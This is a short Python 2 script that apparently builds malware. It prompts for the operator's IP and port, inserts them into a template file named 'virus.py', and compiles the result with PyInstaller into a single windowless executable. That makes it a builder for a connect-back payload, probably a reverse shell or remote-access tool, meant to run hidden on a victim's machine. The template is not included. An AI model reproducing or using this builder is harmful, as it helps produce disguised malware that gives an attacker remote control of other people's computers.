import sys, os, PyInstaller


name = raw_input("Create a name: ")
ip = raw_input("Your ip: ")
port = raw_input("Your port: ")

file = open('virus.py', 'r').read()
code = file.replace('LOCALPORT', port).replace("LOCALIP", ip)

file = open(name+".py", 'w')
file.write(code)
file.close()

comando = "PyInstaller -D -F -w --clean"

icon = "icon.ico"
os.system(comando+" "+name+".py && pause")
